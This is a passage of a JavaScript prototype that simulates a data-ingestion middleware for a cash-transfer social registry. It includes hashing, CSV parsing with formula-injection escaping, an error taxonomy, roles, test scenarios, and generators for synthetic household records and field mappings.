/*
 * CCT DataBridge prototype engine.
 *
 * Pure, deterministic simulation of the ingestion middleware: source configuration,
 * mock API/file adapters, mapping + transformation, validation, de-duplication,
 * idempotent delivery to MASTER_SR1, retry with backoff + jitter, unknown outcomes,
 * MASTER_SR2 replica tracking, reconciliation, error queue, audit and RBAC.
 *
 * Everything external is SIMULATED. No network calls are made. All people and
 * identifiers are synthetic (NINs start with 99, records carry synthetic = true).
 *
 * Works in the browser (window.DataBridge) and in Node (module.exports) for tests.
 */
(function (root, factory) {
  if (typeof module === 'object' && module.exports) module.exports = factory();
  else root.DataBridge = factory();
})(this, function () {
  'use strict';

  // ---------------------------------------------------------------------------
  // Utilities
  // ---------------------------------------------------------------------------

  function mulberry32(seed) {
    let a = seed >>> 0;
    return function () {
      a = (a + 0x6d2b79f5) >>> 0;
      let t = a;
      t = Math.imul(t ^ (t >>> 15), t | 1);
      t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }

  // Compact SHA-256 over UTF-8 strings. Used for idempotency keys and file checksums.
  function sha256(str) {
    const K = [
      0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
      0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
      0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
      0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
      0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
      0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
      0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
      0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
    ];
    const bytes = [];
    const s = unescape(encodeURIComponent(str));
    for (let i = 0; i < s.length; i++) bytes.push(s.charCodeAt(i));
    const bitLen = bytes.length * 8;
    bytes.push(0x80);
    while (bytes.length % 64 !== 56) bytes.push(0);
    for (let i = 7; i >= 0; i--) bytes.push(i >= 4 ? 0 : (bitLen >>> (i * 8)) & 0xff);
    let h = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
    const w = new Array(64);
    const rotr = (x, n) => (x >>> n) | (x << (32 - n));
    for (let off = 0; off < bytes.length; off += 64) {
      for (let i = 0; i < 16; i++) {
        w[i] = (bytes[off + i * 4] << 24) | (bytes[off + i * 4 + 1] << 16) | (bytes[off + i * 4 + 2] << 8) | bytes[off + i * 4 + 3];
      }
      for (let i = 16; i < 64; i++) {
        const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >>> 3);
        const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >>> 10);
        w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;
      }
      let [a, b, c, d, e, f, g, hh] = h;
      for (let i = 0; i < 64; i++) {
        const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
        const ch = (e & f) ^ (~e & g);
        const t1 = (hh + S1 + ch + K[i] + w[i]) | 0;
        const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
        const maj = (a & b) ^ (a & c) ^ (b & c);
        const t2 = (S0 + maj) | 0;
        hh = g; g = f; f = e; e = (d + t1) | 0; d = c; c = b; b = a; a = (t1 + t2) | 0;
      }
      h = [h[0] + a, h[1] + b, h[2] + c, h[3] + d, h[4] + e, h[5] + f, h[6] + g, h[7] + hh].map((x) => x | 0);
    }
    return h.map((x) => (x >>> 0).toString(16).padStart(8, '0')).join('');
  }

  const pad = (n, w) => String(n).padStart(w, '0');
  const DAY = 86400000;
  const dayKey = (ts) => new Date(ts).toISOString().slice(0, 10);
  const isBlank = (v) => v === undefined || v === null || (typeof v === 'string' && v.trim() === '');
  const clone = (o) => JSON.parse(JSON.stringify(o));

  // CSV parsing (RFC 4180 subset). Cell contents are untrusted and never evaluated.
  function parseCsv(text) {
    const rows = [];
    let row = [], cell = '', q = false;
    for (let i = 0; i < text.length; i++) {
      const ch = text[i];
      if (q) {
        if (ch === '"') {
          if (text[i + 1] === '"') { cell += '"'; i++; } else q = false;
        } else cell += ch;
      } else if (ch === '"') q = true;
      else if (ch === ',') { row.push(cell); cell = ''; }
      else if (ch === '\n' || ch === '\r') {
        if (ch === '\r' && text[i + 1] === '\n') i++;
        row.push(cell); cell = '';
        if (row.some((c) => c !== '')) rows.push(row);
        row = [];
      } else cell += ch;
    }
    row.push(cell);
    if (row.some((c) => c !== '')) rows.push(row);
    return rows;
  }

  // Export-side protection against CSV/formula injection (OWASP).
  function csvCell(v) {
    let s = v === undefined || v === null ? '' : String(v);
    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
    return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
  }
  const toCsv = (rows) => rows.map((r) => r.map(csvCell).join(',')).join('\r\n') + '\r\n';

  const looksLikeFormula = (v) => typeof v === 'string' && /^[=+\-@]/.test(v.trim()) && !/^[+-]?\d/.test(v.trim());

  // ---------------------------------------------------------------------------
  // Reference data: error taxonomy, roles, scenarios
  // ---------------------------------------------------------------------------

  const ERROR_TAXONOMY = {
    SOURCE_DISABLED: { stage: 'PREFLIGHT', retryable: false, severity: 'serious', desc: 'Ingestion was requested for a disabled source', action: 'Enable the source (Source Configuration Administrator) and start again.' },
    SOURCE_UNAVAILABLE: { stage: 'EXTRACT', retryable: true, severity: 'critical', desc: 'Source API did not respond or returned 5xx', action: 'Check source health; the run resumes from the last page checkpoint.' },
    AUTHENTICATION_FAILED: { stage: 'AUTHENTICATE', retryable: false, severity: 'critical', desc: 'Source rejected the client credentials (401/403)', action: 'Rotate or re-issue the credential in the vault; do not paste secrets into the console.' },
    RATE_LIMIT_EXCEEDED: { stage: 'EXTRACT', retryable: true, severity: 'warning', desc: 'Source throttled the request (429)', action: 'Handled automatically using Retry-After; reduce page size or schedule off-peak if persistent.' },
    SOURCE_TIMEOUT: { stage: 'EXTRACT', retryable: true, severity: 'warning', desc: 'Source page request timed out', action: 'Handled automatically with backoff; raise if repeated.' },
    SOURCE_SCHEMA_MISMATCH: { stage: 'SCHEMA_CHECK', retryable: false, severity: 'critical', desc: 'Source payload no longer matches the registered schema version', action: 'Register the new schema version, update the mapping, re-run.' },
    FILE_FORMAT_INVALID: { stage: 'UPLOAD_SCAN', retryable: false, severity: 'critical', desc: 'File type, signature or size is not allowed', action: 'Upload a genuine .csv or .xlsx file within the size limit.' },
    FILE_SCHEMA_MISMATCH: { stage: 'SCHEMA_CHECK', retryable: false, severity: 'critical', desc: 'File headers do not match the registered template', action: 'Use the published template or register the new layout as a new template version.' },
    REQUIRED_FIELD_MISSING: { stage: 'VALIDATE', retryable: false, severity: 'serious', desc: 'A mandatory canonical field is empty', action: 'Correct at source and re-submit the record.' },
    FIELD_VALIDATION_FAILED: { stage: 'VALIDATE', retryable: false, severity: 'serious', desc: 'A field failed its format, range or code-list rule', action: 'Correct at source; check the field dictionary for the rule.' },
    FIELD_MAPPING_FAILED: { stage: 'PREFLIGHT', retryable: false, severity: 'critical', desc: 'Mapping configuration is invalid or leaves required fields unmapped', action: 'Fix the mapping in Field Mapping and publish a new version.' },
    TRANSFORMATION_FAILED: { stage: 'MAP_TRANSFORM', retryable: false, severity: 'serious', desc: 'A transformation rule could not convert the source value', action: 'Correct the source value or adjust the transformation rule.' },
    DUPLICATE_RECORD: { stage: 'DEDUPLICATE', retryable: false, severity: 'warning', desc: 'Record duplicates another record in the same batch', action: 'No action needed unless the duplicate is legitimate; fix at source.' },
    MATCH_REQUIRES_REVIEW: { stage: 'DEDUPLICATE', retryable: false, severity: 'warning', desc: 'Possible match with a master record from another source', action: 'Data Quality Analyst reviews: approve as new person or reject.' },
    MASTER_WRITE_FAILED: { stage: 'DELIVER_PRIMARY', retryable: false, severity: 'critical', desc: 'MASTER_SR1 rejected or exhausted retries for the write', action: 'Inspect the destination response; fix data and re-send, or retry if transient.' },
    MASTER_WRITE_OUTCOME_UNKNOWN: { stage: 'DELIVER_PRIMARY', retryable: true, severity: 'critical', desc: 'Write timed out; MASTER_SR1 may or may not have committed it', action: 'Reconcile first (query by idempotency key). Re-sending is safe because the key is stable.' },
    REPLICA_SYNC_PENDING: { stage: 'REPLICA_SYNC', retryable: true, severity: 'warning', desc: 'Record written to MASTER_SR1 but not yet visible in MASTER_SR2', action: 'Wait for replication; investigate if lag exceeds the threshold.' },
    REPLICA_SYNC_FAILED: { stage: 'REPLICA_SYNC', retryable: true, severity: 'serious', desc: 'Record not found in MASTER_SR2 after the replication window', action: 'Trigger a replica re-sync; check replication slot health.' },
    RECONCILIATION_MISMATCH: { stage: 'RECONCILE', retryable: false, severity: 'serious', desc: 'Middleware counts and destination acknowledgements disagree', action: 'Run Reconcile to resolve unknown outcomes against the destination.' },
  };

  const PERMISSIONS = [
    ['source.edit', 'Add / edit / remove sources'],
    ['source.toggle', 'Enable / disable sources'],
    ['source.test', 'Test source connection'],
    ['mapping.edit', 'Edit and publish mappings'],
    ['destination.edit', 'Change destination settings'],
    ['run.start', 'Start ingestion / dry run'],
    ['run.retry', 'Retry failed records'],
    ['run.reconcile', 'Reconcile runs'],
    ['error.resolve', 'Resolve errors and match reviews'],
    ['payload.view', 'View unmasked source payload (with justification)'],
    ['report.download', 'Download reports'],
    ['audit.view', 'View audit log'],
    ['security.view', 'View security configuration'],
  ];

  const ROLES = {
    PLATFORM_ADMIN: { label: 'Platform Administrator', perms: ['source.edit', 'source.toggle', 'source.test', 'mapping.edit', 'destination.edit', 'run.start', 'run.retry', 'run.reconcile', 'error.resolve', 'report.download', 'audit.view', 'security.view'] },
    SOURCE_CONFIG_ADMIN: { label: 'Source Configuration Administrator', perms: ['source.edit', 'source.toggle', 'source.test', 'mapping.edit', 'run.start'] },
    INGESTION_OPERATOR: { label: 'Ingestion Operator', perms: ['source.test', 'run.start', 'run.retry', 'run.reconcile', 'error.resolve', 'report.download'] },
    DATA_QUALITY_ANALYST: { label: 'Data Quality Analyst', perms: ['error.resolve', 'payload.view', 'report.download'] },
    AUDITOR: { label: 'Auditor', perms: ['audit.view', 'security.view', 'report.download'] },
    READ_ONLY: { label: 'Read-Only Viewer', perms: [] },
  };

  const SCENARIOS = [
    { id: 'S01', title: 'Successful API ingestion', source: 'SRC-NSR-NASSCO', mode: 'API', sim: { pages: 3, pageSize: 10 }, expect: 'All records written to SR1 and confirmed in SR2.' },
    { id: 'S02', title: 'Successful CSV import', source: 'SRC-LGA-UPLOAD', mode: 'IMPORT', file: 'good', expect: 'Template file validated, all rows delivered.' },
    { id: 'S03', title: 'Missing required fields', source: 'SRC-NSR-NASSCO', mode: 'API', sim: { missing: 4 }, expect: '4 records rejected before delivery (REQUIRED_FIELD_MISSING).' },
    { id: 'S04', title: 'Invalid field formats', source: 'SRC-STATE-JOSH', mode: 'API', sim: { invalid: 5 }, expect: 'Bad NIN, phone, date and account values rejected with field-level reasons.' },
    { id: 'S05', title: 'Source schema change', source: 'SRC-STATE-JOSH', mode: 'API', sim: { schemaDrift: true }, expect: 'Run stops at schema check; nothing is delivered.' },
    { id: 'S06', title: 'Duplicate source records (file)', source: 'SRC-LGA-UPLOAD', mode: 'IMPORT', file: 'duplicates', expect: 'In-file duplicates held back; formula cell neutralised and rejected.' },
    { id: 'S07', title: 'Cross-source duplicate needs review', source: 'SRC-STATE-JOSH', mode: 'API', sim: { crossSource: 3 }, expect: '3 records share a NIN with NASSCO records and wait for review.' },
    { id: 'S08', title: 'Source authentication failure', source: 'SRC-NSR-NASSCO', mode: 'API', sim: { authFail: true }, expect: 'Run fails at authentication; no data fetched.' },
    { id: 'S09', title: 'API timeout and rate limit', source: 'SRC-NSR-NASSCO', mode: 'API', sim: { rateLimit: true, pageTimeout: true, pages: 4, pageSize: 8 }, expect: '429 and a timeout are retried with backoff; run completes.' },
    { id: 'S10', title: 'Temporary SR1 failure, then retry succeeds', source: 'SRC-NSR-NASSCO', mode: 'API', sim: { transient: 4 }, expect: '4 records wait for retry; advance the clock or retry to deliver.' },
    { id: 'S11', title: 'Permanent SR1 rejection', source: 'SRC-STATE-JOSH', mode: 'API', sim: { permanent: 2 }, expect: '2 records rejected by SR1 (422) and moved to dead letters.' },
    { id: 'S12', title: 'Unknown write outcome', source: 'SRC-NSR-NASSCO', mode: 'API', sim: { unknown: 4 }, expect: '4 writes time out. Reconcile finds 2 committed, 2 safe to resend.' },
    { id: 'S13', title: 'Delayed replica synchronisation', source: 'SRC-NSR-NASSCO', mode: 'API', sim: { replicaDelayMs: 180000 }, expect: 'SR1 writes succeed; SR2 confirmation lags ~3 min.' },
    { id: 'S14', title: 'Replica synchronisation failure', source: 'SRC-STATE-JOSH', mode: 'API', sim: { replicaFail: 3 }, expect: '3 records written to SR1 never appear in SR2.' },
    { id: 'S15', title: 'Partial batch success', source: 'SRC-NSR-NASSCO', mode: 'API', sim: { invalid: 2, transient: 2, permanent: 1, exhaust: 1 }, expect: 'Mixed outcomes incl. one record that exhausts 5 retries.' },
    { id: 'S16', title: 'Mapping configuration error', source: 'SRC-STATE-JOSH', mode: 'API', sim: { mappingBreak: 'gender' }, expect: 'Pre-flight blocks the run: required field gender unmapped.' },
    { id: 'S17', title: 'Disabled source attempts ingestion', source: 'SRC-LEGACY-PILOT', mode: 'IMPORT', file: 'good', expect: 'Start is refused and audited; no run is created.' },
    { id: 'S18', title: 'Malicious upload rejected', source: 'SRC-LGA-UPLOAD', mode: 'IMPORT', file: 'malicious', expect: 'File signature does not match .xlsx; quarantined, never parsed.' },
  ];

  // ---------------------------------------------------------------------------
  // Synthetic people + source renderers
  // ---------------------------------------------------------------------------

  const GIVEN = ['Amina', 'Chinedu', 'Fatima', 'Emeka', 'Ngozi', 'Ibrahim', 'Aisha', 'Tunde', 'Blessing', 'Musa', 'Halima', 'Olumide', 'Zainab', 'Ifeanyi', 'Hauwa', 'Segun', 'Kemi', 'Yusuf', 'Chioma', 'Bello', 'Funmilayo', 'Abdullahi', 'Adaeze', 'Sani'];
  const FAMILY = ['Adebayo', 'Okafor', 'Abubakar', 'Eze', 'Bello', 'Okonkwo', 'Yakubu', 'Afolabi', 'Nwosu', 'Danjuma', 'Ogunleye', 'Umar', 'Chukwu', 'Lawal', 'Obi', 'Garba'];
  // Placeholder geography codes. The real code system is an open decision (build sheet, item 2).
  const GEO = [
    { state_id: 'NG-KN', state_name: 'Kano', lga_id: 'KN-LGA-07', lga_name: 'Dala', lat: 12.0, lon: 8.5, wards: ['Gwammaja', 'Kantudu'] },
    { state_id: 'NG-OY', state_name: 'Oyo', lga_id: 'OY-LGA-12', lga_name: 'Ibadan North', lat: 7.4, lon: 3.9, wards: ['Ward 4', 'Ward 9'] },
    { state_id: 'NG-EN', state_name: 'Enugu', lga_id: 'EN-LGA-03', lga_name: 'Nsukka', lat: 6.86, lon: 7.4, wards: ['Ihe', 'Obukpa'] },
    { state_id: 'NG-PL', state_name: 'Plateau', lga_id: 'PL-LGA-05', lga_name: 'Jos North', lat: 9.9, lon: 8.89, wards: ['Ali Kazaure', 'Naraguta'] },
  ];
  const BANKS = [['1', 'Access'], ['5', 'GT'], ['7', 'UBA'], ['8', 'Zenith'], ['4', 'First']];
  const REL = [['1', 'Head'], ['2', 'Spouse'], ['3', 'Child'], ['3', 'Child'], ['4', 'Grandchild']];

  function makeHouseholds(rng, count, opts) {
    const pick = (arr) => arr[Math.floor(rng() * arr.length)];
    const people = [];
    let hh = 0;
    while (people.length < count) {
      hh++;
      const geo = pick(GEO);
      const serial = `${opts.serialPrefix}-${pad(opts.serialBase + hh, 6)}`;
      const family = pick(FAMILY);
      const size = Math.min(1 + Math.floor(rng() * 4), count - people.length);
      const ward = pick(geo.wards);
      const lat = +(geo.lat + (rng() - 0.5) * 0.2).toFixed(5);
      const lon = +(geo.lon + (rng() - 0.5) * 0.2).toFixed(5);
      for (let m = 0; m < size; m++) {
        const rel = m === 0 ? REL[0] : REL[1 + Math.floor(rng() * (REL.length - 1))];
        const adult = m < 2;
        const year = adult ? 1965 + Math.floor(rng() * 35) : 2008 + Math.floor(rng() * 15);
        const hasNin = adult || rng() > 0.6;
        const bank = pick(BANKS);
        const n = opts.idBase + people.length;
        people.push({
          household_serial: serial, household_address: `${1 + Math.floor(rng() * 80)} ${pick(['Market', 'Mission', 'School', 'Station'])} Road`,
          consent: rng() > 0.05, ...geo, ward, community: `${ward} Community`, lat, lon, accuracy: +(3 + rng() * 12).toFixed(1),
          given: pick(GIVEN), family, other: rng() > 0.7 ? pick(GIVEN) : '',
          dob: `${year}-${pad(1 + Math.floor(rng() * 12), 2)}-${pad(1 + Math.floor(rng() * 28), 2)}`,
          sex: rng() > 0.5 ? '1' : '0', rel_code: rel[0], rel_label: rel[1],
          has_nin: hasNin, nin: hasNin ? '99' + pad(n, 9) : '',
          phone: adult ? '080' + pad(10000000 + n * 37, 8).slice(-8) : '',
          account: adult && m === 0 ? pad(2000000000 + n * 17, 10).slice(-10) : '',
          bank_code: bank[0], bank_label: bank[1], bvn: adult && m === 0 ? '22' + pad(n * 13, 9).slice(-9) : '',
          marital: adult ? '1' : '5', roof: pick(['1', '2', '3']), rooms: 1 + Math.floor(rng() * 4),
          updatedAt: opts.now - Math.floor(rng() * 20) * DAY,
        });
      }
    }
    return people;
  }

  // NASSCO NSR form 4.5 field names (from the build sheet 'NSR form source' column).
  function renderNassco(p) {
    const [y, mo, d] = p.dob.split('-');
    return {
      p_sn: p.household_serial, hhaddress: p.household_address, consent: p.consent ? '1' : '0',
      state_code: p.state_id, state: p.state_name, lga_code: p.lga_id, lga: p.lga_name,
      p_wardid: p.ward, p_communityname: p.community, gps: `${p.lat} ${p.lon} 0 ${p.accuracy}`,
      firstname: p.given, surname: p.family, othername: p.other, year: y, month: mo, day: d,
      sex: p.sex, contactno: p.phone, relationship: p.rel_code, maritalstatus: p.marital,
      validnin: p.has_nin ? '1' : '0', validnintype: p.has_nin ? '1' : '', nin: p.nin,
      accountno: p.account, bank_name: p.account ? p.bank_code : '', accountname: p.account ? `${p.given} ${p.family}` : '', bvn: p.bvn,
      roof_dwelling: p.roof, num_room: String(p.rooms),
    };
  }

  // Illustrative state registry layout (assumed; real contract not yet supplied).
  function renderJosh(p) {
    const [y, mo, d] = p.dob.split('-');
    return {
      householdId: p.household_serial, address: p.household_address, consentGiven: p.consent,
      stateCode: p.state_id, stateName: p.state_name, lgaCode: p.lga_id, lgaName: p.lga_name,
      wardName: p.ward, communityName: p.community, lat: p.lat, lng: p.lon,
      firstName: p.given, lastName: p.family, middleName: p.other, dateOfBirth: `${d}/${mo}/${y}`,
      gender: p.sex === '1' ? 'M' : 'F', mobile: p.phone ? '+234' + p.phone.slice(1) : '', relationToHead: p.rel_label,
      ninStatus: p.has_nin ? 'Y' : 'N', nationalId: p.nin, bankAccount: p.account, bankName: p.account ? p.bank_label : '',
      accountHolder: p.account ? `${p.given} ${p.family}` : '', bvnNumber: p.bvn, lastUpdated: new Date(p.updatedAt).toISOString(),
    };
  }

  // CCT template: headers are canonical names (subset used by the demo data).
  function renderTemplate(p) {
    return {
      nsr_household_serial: p.household_serial, household_address: p.household_address, consent_to_share_data: p.consent ? '1' : '0',
      state_id: p.state_id, state_name: p.state_name, lga_id: p.lga_id, lga_name: p.lga_name, ward: p.ward, community: p.community,
      latitude: String(p.lat), longitude: String(p.lon), accuracy_m: String(p.accuracy),
      given_name: p.given, family_name: p.family, additional_name: p.other, birth_date: p.dob, gender: p.sex,
      phone_number: p.phone, relationship_to_head: p.rel_code, marital_status: p.marital, has_valid_nin: p.has_nin ? '1' : '0',
      nin_type: p.has_nin ? '1' : '', nin: p.nin, account_number: p.account, bank_name: p.account ? p.bank_code : '',
      account_name: p.account ? `${p.given} ${p.family}` : '', bvn: p.bvn, roof_material: p.roof, rooms_occupied: String(p.rooms),
    };
  }

  const RENDERERS = { NASSCO_FORM_45: renderNassco, JOSH_V2: renderJosh, CCT_TEMPLATE_V1: renderTemplate };
  const SOURCE_KEY_FIELD = { NASSCO_FORM_45: (r) => `${r.p_sn}:${r.nin || r.firstname + '-' + r.year + r.month + r.day}`, JOSH_V2: (r) => `${r.householdId}:${r.nationalId || r.firstName + '-' + r.dateOfBirth}`, CCT_TEMPLATE_V1: (r) => `${r.nsr_household_serial}:${r.nin || r.given_name + '-' + r.birth_date}` };

  // Faults applied to source-shaped payloads, by layout.
  const FAULTS = {
    missing: { NASSCO_FORM_45: (r) => { r.surname = ''; }, JOSH_V2: (r) => { r.lastName = ''; }, CCT_TEMPLATE_V1: (r) => { r.family_name = ''; } },
    invalid: [
      { NASSCO_FORM_45: (r) => { r.nin = r.nin ? r.nin.slice(0, 9) : '123'; r.validnin = '1'; r.validnintype = '1'; }, JOSH_V2: (r) => { r.nationalId = '99A12'; r.ninStatus = 'Y'; }, CCT_TEMPLATE_V1: (r) => { r.nin = '12345'; r.has_valid_nin = '1'; r.nin_type = '1'; } },
      { NASSCO_FORM_45: (r) => { r.contactno = '12345'; }, JOSH_V2: (r) => { r.mobile = '+1-555-0100'; }, CCT_TEMPLATE_V1: (r) => { r.phone_number = 'not-a-phone'; } },
      { NASSCO_FORM_45: (r) => { r.month = '13'; }, JOSH_V2: (r) => { r.dateOfBirth = '31/02/1990'; }, CCT_TEMPLATE_V1: (r) => { r.birth_date = '2031-01-01'; } },
      { NASSCO_FORM_45: (r) => { r.accountno = '12345678'; r.bank_name = '1'; r.accountname = 'Test'; }, JOSH_V2: (r) => { r.bankAccount = '0012'; r.bankName = 'Access'; r.accountHolder = 'Test'; }, CCT_TEMPLATE_V1: (r) => { r.account_number = '99'; r.bank_name = '1'; r.account_name = 'Test'; } },
      { NASSCO_FORM_45: (r) => { r.sex = '7'; }, JOSH_V2: (r) => { r.gender = 'X'; }, CCT_TEMPLATE_V1: (r) => { r.gender = '9'; } },
    ],
  };

  // ---------------------------------------------------------------------------
  // Transformations
  // ---------------------------------------------------------------------------

  const TRANSFORMS = {
    direct: { label: 'Direct', arg: false },
    trim: { label: 'Trim + collapse spaces', arg: false },
    titlecase: { label: 'Trim + title case', arg: false },
    digits: { label: 'Digits only', arg: false },
    boolean: { label: 'To boolean', arg: false },
    integer: { label: 'To integer', arg: false },
    decimal: { label: 'To decimal', arg: false },
    date_dmy: { label: 'Date DD/MM/YYYY → ISO', arg: false },
    date_parts: { label: 'Year + month + day → ISO date', arg: false },
    codelist: { label: 'Code-list lookup', arg: 'code list name' },
    value_map: { label: 'Value map', arg: 'from=to pairs, e.g. M=1;F=0' },
    split: { label: 'Split and take part', arg: 'part index (0-based), space separated' },
    phone_e164: { label: 'Phone → +234 format', arg: false },
    if_equals: { label: 'Conditional value', arg: 'when=value, e.g. Y=1' },
    constant: { label: 'Configured default', arg: 'constant value' },
  };

  function applyTransform(op, arg, values, codeLists) {
    const v = values[0];
    const str = isBlank(v) ? '' : String(v);
    switch (op) {
      case 'direct': return isBlank(v) ? null : v;
      case 'trim': return str ? str.trim().replace(/\s+/g, ' ') : null;
      case 'titlecase': return str ? str.trim().replace(/\s+/g, ' ').toLowerCase().replace(/(^|[\s'-])\p{L}/gu, (c) => c.toUpperCase()) : null;
      case 'digits': return str ? str.replace(/\D/g, '') : null;
      case 'boolean': {
        if (typeof v === 'boolean') return v;
        if (!str) return null;
        const s = str.trim().toLowerCase();
        if (['1', 'y', 'yes', 'true'].includes(s)) return true;
        if (['0', 'n', 'no', 'false'].includes(s)) return false;
        throw new Error('not a boolean value');
      }
      case 'integer': {
        if (!str) return null;
        if (!/^-?\d+$/.test(str.trim())) throw new Error('not an integer');
        return parseInt(str, 10);
      }
      case 'decimal': {
        if (!str) return null;
        const n = Number(str);
        if (!isFinite(n)) throw new Error('not a number');
        return n;
      }
      case 'date_dmy': {
        if (!str) return null;
        const m = /^(\d{1,2})\/(\d{1,2})\/(\d{4})$/.exec(str.trim());
        if (!m) throw new Error('expected DD/MM/YYYY');
        return isoDate(m[3], m[2], m[1]);
      }
      case 'date_parts': {
        const [y, mo, d] = values;
        if (isBlank(y)) return null;
        return isoDate(y, isBlank(mo) ? '07' : mo, isBlank(d) ? '01' : d);
      }
      case 'codelist': {
        if (!str) return null;
        const list = codeLists[arg];
        if (!list) throw new Error(`code list '${arg}' not configured`);
        const hit = list.find((c) => c.code === str.trim()) || list.find((c) => c.label.toLowerCase() === str.trim().toLowerCase());
        if (!hit) throw new Error(`value not in code list '${arg}'`);
        return hit.code;
      }
      case 'value_map': {
        if (!str) return null;
        const pairs = Object.fromEntries(String(arg || '').split(';').filter(Boolean).map((p) => p.split('=').map((s) => s.trim())));
        if (!(str in pairs)) throw new Error('value not in value map');
        return pairs[str];
      }
      case 'split': {
        if (!str) return null;
        const part = str.trim().split(/\s+/)[parseInt(arg, 10) || 0];
        return isBlank(part) ? null : part;
      }
      case 'phone_e164': {
        if (!str) return null;
        const s = str.replace(/[\s-]/g, '');
        if (/^0[789][01]\d{8}$/.test(s)) return '+234' + s.slice(1);
        return s;
      }
      case 'if_equals': {
        const [when, then] = String(arg || '').split('=');
        return str === when ? then : null;
      }
      case 'constant': return arg;
      default: throw new Error(`unknown transform '${op}'`);
    }
  }

  function isoDate(y, m, d) {
    const yy = parseInt(y, 10), mm = parseInt(m, 10), dd = parseInt(d, 10);
    const dt = new Date(Date.UTC(yy, mm - 1, dd));
    if (!yy || dt.getUTCFullYear() !== yy || dt.getUTCMonth() !== mm - 1 || dt.getUTCDate() !== dd) throw new Error('not a valid calendar date');
    return `${yy}-${pad(mm, 2)}-${pad(dd, 2)}`;
  }

  // ---------------------------------------------------------------------------
  // Seed configuration: sources, mappings, destinations
  // ---------------------------------------------------------------------------

  const m = (sources, op, target, arg) => ({ sources: [].concat(sources), op, arg: arg === undefined ? null : arg, target });

  const MAPPINGS = {
    NASSCO_FORM_45: [
      m('p_sn', 'trim', 'nsr_household_serial'), m('hhaddress', 'trim', 'household_address'), m('consent', 'boolean', 'consent_to_share_data'),
      m('state_code', 'direct', 'state_id'), m('state', 'trim', 'state_name'), m('lga_code', 'direct', 'lga_id'), m('lga', 'trim', 'lga_name'),
      m('p_wardid', 'trim', 'ward'), m('p_communityname', 'trim', 'community'),
      m('gps', 'split', 'latitude', '0'), m('gps', 'split', 'longitude', '1'), m('gps', 'split', 'accuracy_m', '3'),
      m([], 'constant', 'coordinate_source', 'NSR field enumeration'),
      m('firstname', 'titlecase', 'given_name'), m('surname', 'titlecase', 'family_name'), m('othername', 'titlecase', 'additional_name'),
      m(['year', 'month', 'day'], 'date_parts', 'birth_date'), m('sex', 'codelist', 'gender', 'sex'), m('contactno', 'phone_e164', 'phone_number'),
      m('relationship', 'codelist', 'relationship_to_head', 'relationship'), m('maritalstatus', 'codelist', 'marital_status', 'marital'),
      m('validnin', 'boolean', 'has_valid_nin'), m('validnintype', 'codelist', 'nin_type', 'validnintype'), m('nin', 'digits', 'nin'),
      m('accountno', 'trim', 'account_number'), m('bank_name', 'codelist', 'bank_name', 'bankname'), m('accountname', 'trim', 'account_name'), m('bvn', 'digits', 'bvn'),
      m('roof_dwelling', 'codelist', 'roof_material', 'roof'), m('num_room', 'integer', 'rooms_occupied'),
    ],
    JOSH_V2: [
      m('householdId', 'trim', 'nsr_household_serial'), m('address', 'trim', 'household_address'), m('consentGiven', 'boolean', 'consent_to_share_data'),
      m('stateCode', 'direct', 'state_id'), m('stateName', 'trim', 'state_name'), m('lgaCode', 'direct', 'lga_id'), m('lgaName', 'trim', 'lga_name'),
      m('wardName', 'trim', 'ward'), m('communityName', 'trim', 'community'), m('lat', 'decimal', 'latitude'), m('lng', 'decimal', 'longitude'),
      m('firstName', 'titlecase', 'given_name'), m('lastName', 'titlecase', 'family_name'), m('middleName', 'titlecase', 'additional_name'),
      m('dateOfBirth', 'date_dmy', 'birth_date'), m('gender', 'value_map', 'gender', 'M=1;F=0'), m('mobile', 'phone_e164', 'phone_number'),
      m('relationToHead', 'value_map', 'relationship_to_head', 'Head=1;Spouse=2;Child=3;Grandchild=4'), m('ninStatus', 'boolean', 'has_valid_nin'),
      m('ninStatus', 'if_equals', 'nin_type', 'Y=1'), m('nationalId', 'trim', 'nin'),
      m('bankAccount', 'trim', 'account_number'), m('bankName', 'codelist', 'bank_name', 'bankname'), m('accountHolder', 'trim', 'account_name'), m('bvnNumber', 'digits', 'bvn'),
    ],
    CCT_TEMPLATE_V1: null, // generated: identity mapping over template headers
  };

  const SOURCE_SCHEMAS = {
    NASSCO_FORM_45: Object.keys(renderNassco(makeHouseholds(mulberry32(1), 1, { serialPrefix: 'X', serialBase: 0, idBase: 0, now: 0 })[0])),
    JOSH_V2: Object.keys(renderJosh(makeHouseholds(mulberry32(1), 1, { serialPrefix: 'X', serialBase: 0, idBase: 0, now: 0 })[0])),
    CCT_TEMPLATE_V1: Object.keys(renderTemplate(makeHouseholds(mulberry32(1), 1, { serialPrefix: 'X', serialBase: 0, idBase: 0, now: 0 })[0])),
  };

  function templateMapping(schema) {
